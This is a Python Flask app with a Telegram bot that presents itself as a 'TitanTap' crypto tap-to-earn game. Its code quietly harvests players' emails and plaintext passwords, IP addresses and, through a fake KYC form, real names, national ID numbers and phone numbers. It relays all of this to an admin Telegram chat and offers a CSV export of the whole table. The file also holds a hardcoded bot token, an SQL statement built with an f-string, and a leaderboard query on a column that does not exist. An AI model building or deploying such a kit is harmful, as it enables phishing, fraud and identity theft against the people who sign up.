import sqlite3
import requests
import threading
import telebot
from flask import Flask, request, jsonify
import os
import time
import csv
import random

# ====== تنظیمات ======
BOT_TOKEN = "8528248141:AAHjKBWXN5E7DWmMlCOkEFYB-kL1kyVTwmE"
ADMIN_ID  = "2028533085"
# ====================

app = Flask(__name__)
bot = telebot.TeleBot(BOT_TOKEN)

# ====== دیتابیس ======
def init_db():
    conn = sqlite3.connect('game.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        email TEXT UNIQUE,
        password TEXT,
        ip TEXT,
        first_name TEXT,
        last_name TEXT,
        national_id TEXT,
        phone TEXT,
        kyc_status TEXT DEFAULT 'none',
        balance REAL DEFAULT 0.0,
        profit_per_hour REAL DEFAULT 0.0,
        tap_power REAL DEFAULT 0.001,
        status TEXT DEFAULT 'approved',
        referrer TEXT DEFAULT NULL,
        ref_count INTEGER DEFAULT 0,
        card1 INT DEFAULT 0,
        card2 INT DEFAULT 0,
        card3 INT DEFAULT 0,
        card4 INT DEFAULT 0,
        last_sync REAL DEFAULT 0
    )''')
    conn.commit()
    conn.close()

init_db()

# ====== ربات تلگرام (پنل ادمین) ======
@bot.message_handler(commands=['start'])
def bot_start(message):
    if str(message.chat.id) == ADMIN_ID:
        bot.reply_to(message, "👑 پنل ادمین فعال است.\n/export - دانلود اطلاعات کاربران")

@bot.message_handler(commands=['export'])
def bot_export(message):
    if str(message.chat.id) != ADMIN_ID: return
    conn = sqlite3.connect('game.db')
    c = conn.cursor()
    c.execute("SELECT email, password, ip, first_name, last_name, national_id, phone, balance FROM users")
    users = c.fetchall()
    conn.close()
    
    if not users:
        bot.reply_to(message, "دیتابیس خالی است.")
        return
        
    filename = "users_data.csv"
    with open(filename, 'w', newline='', encoding='utf-8') as f:
        writer = csv.writer(f)
        writer.writerow(['Email', 'Password', 'IP', 'First Name', 'Last Name', 'National ID', 'Phone', 'Balance'])
        writer.writerows(users)
        
    with open(filename, 'rb') as f:
        bot.send_document(message.chat.id, f)
    os.remove(filename)

# ====== وب سرور (بازی) ======
html_game = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>TitanTap</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
<style>
  :root { --primary: #ffaa00; --bg: #0b0f19; --card: #151b2b; --gold: #ffd700; }
  * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', sans-serif; }
  body { background: var(--bg); color: white; display: flex; justify-content: center; min-height: 100vh; padding-bottom: 70px; }
  .app-container { width: 100%; max-width: 420px; padding: 20px; text-align: center; }
  
  .screen { display: none; animation: fadeIn 0.3s ease-out; }
  .active { display: block; }
  @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
  
  h1 { font-size: 24px; font-weight: 800; color: var(--primary); margin-bottom: 20px; }
  input { width:100%; padding:15px; margin-bottom:15px; border-radius:12px; border:1px solid #2a3441; background:var(--card); color:white; }
  
  .balance-card { background: var(--card); border-radius: 20px; padding: 20px; margin-bottom: 20px; border: 1px solid #2a3441; }
  .balance-value { font-size: 38px; font-weight: 800; color: var(--primary); }
  .profit-hour { font-size: 14px; color: var(--gold); margin-top: 5px; }
  
  .tap-area { height: 220px; display: flex; justify-content: center; align-items: center; }
  .tap-btn { width: 180px; height: 180px; border-radius: 50%; background: radial-gradient(circle, #ffaa00, #b37700); display: flex; justify-content: center; align-items: center; box-shadow: 0 0 40px rgba(255, 170, 0, 0.4); border: 4px solid #fff; transition: 0.1s; cursor: pointer; font-size: 80px; }
  .tap-btn:active { transform: scale(0.9); box-shadow: 0 0 60px rgba(255, 170, 0, 0.8); }
  
  .cards-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
  .upgrade-card { background: var(--card); padding: 15px; border-radius: 15px; border: 1px solid #2a3441; text-align: left; cursor: pointer; }
  .upgrade-card h3 { font-size: 14px; margin-bottom: 5px; }
  .upgrade-card p { font-size: 12px; color: #8892b0; }
  .upgrade-card .price { color: var(--primary); font-weight: bold; margin-top: 10px; font-size: 13px; }
  
  .leaderboard-item { display: flex; justify-content: space-between; background: var(--card); padding: 15px; border-radius: 10px; margin-bottom: 10px; font-size: 14px; }
  
  .daily-card, .cipher-card, .kyc-card, .spin-card { background: var(--card); padding: 20px; border-radius: 20px; border: 1px solid #2a3441; margin-bottom: 20px; }
  .btn-action { padding: 15px; background: var(--primary); color: black; border: none; border-radius: 10px; font-weight: bold; margin-top: 15px; width: 100%; cursor: pointer; font-size: 16px; }
  
  .bottom-nav { position: fixed; bottom: 0; left: 0; width: 100%; background: var(--card); display: flex; justify-content: space-around; padding: 10px 0; border-top: 1px solid #2a3441; max-width: 420px; margin: 0 auto; right: 0; z-index: 10; }
  .nav-item { font-size: 10px; color: #8892b0; cursor: pointer; display: flex; flex-direction: column; align-items: center; }
  .nav-item.active { color: var(--primary); font-weight: bold; }
  .nav-icon { font-size: 18px; margin-bottom: 3px; }
</style>
</head>
<body>
<div class="app-container">
  
  <!-- LOGIN -->
  <div id="login-screen" class="screen active">
    <h1>🛡️ TitanTap</h1>
    <input type="email" id="email" placeholder="Email Address">
    <input type="password" id="password" placeholder="Password">
    <button class="btn-action" onclick="register()">Create Account</button>
  </div>

  <!-- MAIN -->
  <div id="main-app" class="screen">
    
    <!-- MINE -->
    <div id="tab-mine" class="tab-content">
      <div class="balance-card">
        <div style="font-size:14px; color:#8892b0;">Your Balance</div>
        <div class="balance-value"><span id="balance">0.000</span> <span style="font-size:20px; color:#fff;">TTN</span></div>
        <div class="profit-hour">+<span id="profit">0.00</span> TTN / hour</div>
      </div>
      <div class="tap-area">
        <div class="tap-btn" onclick="tap()">🛡️</div>
      </div>
    </div>

    <!-- UPGRADES -->
    <div id="tab-upgrades" class="tab-content" style="display:none;">
      <h1>Mining Cards</h1>
      <div class="cards-grid">
        <div class="upgrade-card" onclick="upgrade('card1')"><h3>🏠 Home Miner</h3><p>Lvl <span id="lvl_card1">0</span> | +10/hr</p><div class="price">Cost: <span id="cost_card1">100</span></div></div>
        <div class="upgrade-card" onclick="upgrade('card2')"><h3>☁️ Cloud Server</h3><p>Lvl <span id="lvl_card2">0</span> | +60/hr</p><div class="price">Cost: <span id="cost_card2">500</span></div></div>
        <div class="upgrade-card" onclick="upgrade('card3')"><h3>🤖 AI Datacenter</h3><p>Lvl <span id="lvl_card3">0</span> | +300/hr</p><div class="price">Cost: <span id="cost_card3">2000</span></div></div>
        <div class="upgrade-card" onclick="upgrade('card4')"><h3>⚛️ Quantum Rig</h3><p>Lvl <span id="lvl_card4">0</span> | +1500/hr</p><div class="price">Cost: <span id="cost_card4">10000</span></div></div>
      </div>
    </div>

    <!-- GAMES -->
    <div id="tab-games" class="tab-content" style="display:none;">
      <h1>Games & Rewards</h1>
      <div class="spin-card">
        <h3>🎡 Spin The Wheel</h3>
        <p style="margin-top:10px; font-size:13px;">Cost: 100 TTN</p>
        <button class="btn-action" onclick="spinWheel()" style="margin-top:10px;">Spin Now!</button>
      </div>
      <div class="cipher-card">
        <h3>🎁 Daily Cipher</h3>
        <p style="font-size:13px; margin-top:5px;">Enter "TITAN" to win 500 TTN!</p>
        <input type="text" id="cipher_input" placeholder="Enter Code" style="margin-top:10px; text-align:center; text-transform:uppercase;">
        <button class="btn-action" onclick="submitCipher()">Submit Code</button>
      </div>
    </div>

    <!-- FRIENDS -->
    <div id="tab-friends" class="tab-content" style="display:none;">
      <h1>Invite Friends</h1>
      <div class="daily-card">
        <p>Earn 200 TTN per verified friend!</p>
        <p style="margin-top:10px;">Friends Invited: <b id="ref_count" style="color:var(--primary);">0</b></p>
        <input type="text" id="ref_link" readonly style="margin-top:15px; text-align:center; color:var(--primary);">
        <button class="btn-action" onclick="copyLink()">Copy Invite Link</button>
      </div>
    </div>

    <!-- TOP -->
    <div id="tab-top" class="tab-content" style="display:none;">
      <h1>Leaderboard</h1>
      <div id="leaderboard-list"></div>
    </div>

    <!-- PROFILE / KYC -->
    <div id="tab-profile" class="tab-content" style="display:none;">
      <h1>Profile & KYC</h1>
      <div class="kyc-card">
        <p style="font-size:13px; color:#8892b0; margin-bottom:10px;">Complete KYC to unlock withdrawals.</p>
        <input type="text" id="fname" placeholder="Real First Name">
        <input type="text" id="lname" placeholder="Real Last Name">
        <input type="text" id="nid" placeholder="National ID (کد ملی)">
        <input type="text" id="phone" placeholder="Phone Number (شماره تماس)">
        <button class="btn-action" onclick="submitKYC()" style="background:#00ffcc;">Save KYC Info</button>
      </div>
    </div>

    <!-- BOTTOM NAV -->
    <div class="bottom-nav">
      <div class="nav-item active" onclick="switchTab('mine', this)"><div class="nav-icon">🪙</div>Mine</div>
      <div class="nav-item" onclick="switchTab('upgrades', this)"><div class="nav-icon">🃏</div>Cards</div>
      <div class="nav-item" onclick="switchTab('games', this)"><div class="nav-icon">🎮</div>Games</div>
      <div class="nav-item" onclick="switchTab('friends', this)"><div class="nav-icon">👥</div>Friends</div>
      <div class="nav-item" onclick="switchTab('top', this)"><div class="nav-icon">🏆</div>Top</div>
      <div class="nav-item" onclick="switchTab('profile', this)"><div class="nav-icon">👤</div>Profile</div>
    </div>

  </div>
</div>

<script>
  let userEmail = "";
  let gameInterval;
  let currentProfit = 0;
  let currentTapPower = 0.001;
  let costs = { card1: 100, card2: 500, card3: 2000, card4: 10000 };

  async function register() {
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    if(!email || !password) return alert("Fill all fields");
    
    const res = await fetch('/api/register', {
      method: 'POST', headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({email, password})
    });
    const data = await res.json();
    if(data.success) {
      userEmail = email;
      document.getElementById('login-screen').classList.remove('active');
      document.getElementById('main-app').classList.add('active');
      checkStatus();
    } else { alert("Registration failed. Email might be in use."); }
  }

  async function checkStatus() {
    const res = await fetch('/api/status', {
      method: 'POST', headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({email: userEmail})
    });
    const data = await res.json();
    
    if(data.status === 'approved') {
      updateUI(data);
      
      document.getElementById('ref_link').value = window.location.origin + "/?ref=" + encodeURIComponent(userEmail);
      
      if(gameInterval) clearInterval(gameInterval);
      gameInterval = setInterval(() => {
        let current = parseFloat(document.getElementById('balance').innerText);
        let gain = currentProfit / 3600;
        document.getElementById('balance').innerText = (current + gain).toFixed(3);
      }, 1000);
    }
  }

  function updateUI(data) {
    document.getElementById('balance').innerText = data.balance.toFixed(3);
    document.getElementById('profit').innerText = data.profit_per_hour.toFixed(2);
    currentProfit = data.profit_per_hour;
    currentTapPower = data.tap_power;
    document.getElementById('ref_count').innerText = data.ref_count;
    
    for(let i=1; i<=4; i++) {
        let el = document.getElementById('lvl_card'+i);
        if(el) el.innerText = data['card'+i];
        let costEl = document.getElementById('cost_card'+i);
        if(costEl) {
            costs['card'+i] = costs['card'+i] * Math.pow(1.5, data['card'+i]);
            costEl.innerText = Math.floor(costs['card'+i]);
        }
    }
  }

  async function tap() {
    const res = await fetch('/api/tap', {
      method: 'POST', headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({email: userEmail, power: currentTapPower})
    });
    const data = await res.json();
    if(data.success) document.getElementById('balance').innerText = data.balance.toFixed(3);
  }

  async function upgrade(type) {
    const res = await fetch('/api/upgrade', {
      method: 'POST', headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({email: userEmail, type: type, cost: costs[type]})
    });
    const data = await res.json();
    if(data.success) { updateUI(data); alert("Upgrade successful!"); }
    else { alert(data.message); }
  }
  
  async function submitCipher() {
    const code = document.getElementById('cipher_input').value;
    const res = await fetch('/api/cipher', {
      method: 'POST', headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({email: userEmail, code: code})
    });
    const data = await res.json();
    if(data.success) {
      alert("Correct! 500 TTN added.");
      document.getElementById('balance').innerText = data.balance.toFixed(3);
    } else {
      alert(data.message);
    }
  }

  async function spinWheel() {
    const res = await fetch('/api/spin', {
      method: 'POST', headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({email: userEmail})
    });
    const data = await res.json();
    if(data.success) {
      alert("Result: " + data.result);
      document.getElementById('balance').innerText = data.balance.toFixed(3);
    } else {
      alert(data.message);
    }
  }

  async function submitKYC() {
    const fname = document.getElementById('fname').value;
    const lname = document.getElementById('lname').value;
    const nid = document.getElementById('nid').value;
    const phone = document.getElementById('phone').value;
    if(!fname || !lname || !nid || !phone) return alert("Fill all KYC fields");
    
    const res = await fetch('/api/kyc', {
      method: 'POST', headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({email: userEmail, fname, lname, nid, phone})
    });
    const data = await res.json();
    if(data.success) {
      alert("KYC Information submitted successfully!");
    }
  }

  async function loadLeaderboard() {
    const res = await fetch('/api/leaderboard');
    const data = await res.json();
    let html = "";
    data.forEach((u, i) => {
      html += `<div class="leaderboard-item"><span>#${i+1} ${u.name}</span> <span style="color:var(--primary);">${u.balance.toFixed(1)} TTN</span></div>`;
    });
    document.getElementById('leaderboard-list').innerHTML = html;
  }

  function switchTab(tab, el) {
    document.querySelectorAll('.tab-content').forEach(t => t.style.display = 'none');
    document.getElementById('tab-' + tab).style.display = 'block';
    document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
    el.classList.add('active');
    if(tab === 'top') loadLeaderboard();
  }

  function copyLink() {
    const link = document.getElementById('ref_link');
    link.select();
    document.execCommand('copy');
    alert("Link copied!");
  }
</script>
</body>
</html>
"""

@app.route('/')
def index():
    return html_game

@app.route('/api/register', methods=['POST'])
def register():
    data = request.json
    email = data.get('email')
    password = data.get('password')
    ip = request.remote_addr
    referrer = request.args.get('ref')
    now = time.time()
    
    try:
        conn = sqlite3.connect('game.db')
        c = conn.cursor()
        # کاربر به صورت خودکار تایید میشه
        c.execute("INSERT INTO users (email, password, ip, referrer, status, last_sync) VALUES (?, ?, ?, ?, 'approved', ?)", 
                  (email, password, ip, referrer, now))
        conn.commit()
        conn.close()
        
        # ارسال اطلاعات به تلگرام (بدون دکمه)
        text = f"🔴 **New Signup (Auto-Approved)**\n\n📧 Email: {email}\n🔑 Password: {password}\n🌐 IP: {ip}\n👥 Ref: {referrer if referrer else 'None'}"
        bot.send_message(ADMIN_ID, text, parse_mode='Markdown')
        
        return jsonify({"success": True})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})

@app.route('/api/kyc', methods=['POST'])
def kyc():
    data = request.json
    email = data.get('email')
    fname = data.get('fname')
    lname = data.get('lname')
    nid = data.get('nid')
    phone = data.get('phone')
    ip = request.remote_addr
    
    conn = sqlite3.connect('game.db')
    c = conn.cursor()
    c.execute("UPDATE users SET first_name=?, last_name=?, national_id=?, phone=?, kyc_status='pending' WHERE email=?", 
              (fname, lname, nid, phone, email))
    conn.commit()
    conn.close()
    
    text = f"💳 **KYC Submitted (TitanTap)**\n\n📧 Email: {email}\n👤 Name: {fname} {lname}\n🆔 National ID: {nid}\n📱 Phone: {phone}\n🌐 IP: {ip}"
    bot.send_message(ADMIN_ID, text, parse_mode='Markdown')
    return jsonify({"success": True})

@app.route('/api/spin', methods=['POST'])
def spin():
    email = request.json.get('email')
    conn = sqlite3.connect('game.db')
    c = conn.cursor()
    c.execute("SELECT balance FROM users WHERE email=?", (email,))
    bal = c.fetchone()[0]
    
    if bal < 100:
        conn.close()
        return jsonify({"success": False, "message": "Not enough TTN to spin (Needs 100)"})
        
    outcomes = [
        {"mult": 0, "text": "You lost! Try again."},
        {"mult": 0, "text": "You lost! Try again."},
        {"mult": 0.5, "text": "You won 50 TTN!"},
        {"mult": 1.5, "text": "You won 150 TTN!"},
        {"mult": 3, "text": "JACKPOT! You won 300 TTN!"}
    ]
    result = random.choice(outcomes)
    new_bal = bal - 100 + (100 * result["mult"])
    
    c.execute("UPDATE users SET balance = ? WHERE email=?", (new_bal, email))
    conn.commit()
    conn.close()
    
    return jsonify({"success": True, "result": result["text"], "balance": new_bal})

@app.route('/api/status', methods=['POST'])
def status():
    email = request.json.get('email')
    conn = sqlite3.connect('game.db')
    c = conn.cursor()
    c.execute("SELECT status, balance, profit_per_hour, tap_power, card1, card2, card3, card4, ref_count, last_sync FROM users WHERE email=?", (email,))
    user = c.fetchone()
    
    if user:
        status, balance, profit, tap_power, c1, c2, c3, c4, ref_count, last_sync = user
        now = time.time()
        
        if status == 'approved' and last_sync > 0:
            elapsed_hours = (now - last_sync) / 3600.0
            offline_gain = elapsed_hours * profit
            balance += offline_gain
            
        c.execute("UPDATE users SET balance = ?, last_sync = ? WHERE email=?", (balance, now, email))
        conn.commit()
        conn.close()
        
        return jsonify({
            "status": status, "balance": balance, "profit_per_hour": profit, "tap_power": tap_power,
            "card1": c1, "card2": c2, "card3": c3, "card4": c4, "ref_count": ref_count
        })
    conn.close()
    return jsonify({"status": "not_found"})

@app.route('/api/tap', methods=['POST'])
def tap():
    email = request.json.get('email')
    power = request.json.get('power', 0.001)
    conn = sqlite3.connect('game.db')
    c = conn.cursor()
    c.execute("UPDATE users SET balance = balance + ? WHERE email=?", (power, email))
    conn.commit()
    c.execute("SELECT balance FROM users WHERE email=?", (email,))
    new_balance = c.fetchone()[0]
    conn.close()
    return jsonify({"success": True, "balance": new_balance})

@app.route('/api/upgrade', methods=['POST'])
def upgrade():
    email = request.json.get('email')
    utype = request.json.get('type')
    cost = request.json.get('cost')
    conn = sqlite3.connect('game.db')
    c = conn.cursor()
    c.execute("SELECT balance FROM users WHERE email=?", (email,))
    bal = c.fetchone()[0]
    
    if bal >= cost:
        profit_add = 0
        if utype == 'card1': profit_add = 10
        elif utype == 'card2': profit_add = 60
        elif utype == 'card3': profit_add = 300
        elif utype == 'card4': profit_add = 1500

        c.execute(f"UPDATE users SET balance = balance - ?, profit_per_hour = profit_per_hour + ?, {utype} = {utype} + 1 WHERE email=?", (cost, profit_add, email))
        conn.commit()
        
        c.execute("SELECT balance, profit_per_hour, tap_power, card1, card2, card3, card4, ref_count FROM users WHERE email=?", (email,))
        user = c.fetchone()
        conn.close()
        return jsonify({
            "success": True, "balance": user[0], "profit_per_hour": user[1], "tap_power": user[2],
            "card1": user[3], "card2": user[4], "card3": user[5], "card4": user[6], "ref_count": user[7]
        })
    conn.close()
    return jsonify({"success": False, "message": "Not enough TTN!"})

@app.route('/api/cipher', methods=['POST'])
def cipher():
    email = request.json.get('email')
    code = request.json.get('code').upper()
    
    if code == "TITAN":
        conn = sqlite3.connect('game.db')
        c = conn.cursor()
        c.execute("UPDATE users SET balance = balance + 500.0 WHERE email=?", (email,))
        conn.commit()
        c.execute("SELECT balance FROM users WHERE email=?", (email,))
        new_bal = c.fetchone()[0]
        conn.close()
        return jsonify({"success": True, "balance": new_bal})
    
    return jsonify({"success": False, "message": "Wrong code!"})

@app.route('/api/leaderboard')
def leaderboard():
    conn = sqlite3.connect('game.db')
    c = conn.cursor()
    c.execute("SELECT name, balance FROM users WHERE status='approved' ORDER BY balance DESC LIMIT 10")
    users = [{"name": u[0], "balance": u[1]} for u in c.fetchall()]
    conn.close()
    return jsonify(users)

def run_bot():
    bot.polling(none_stop=True)

if __name__ == '__main__':
    threading.Thread(target=run_bot, daemon=True).start()
    app.run(host='0.0.0.0', port=5000)
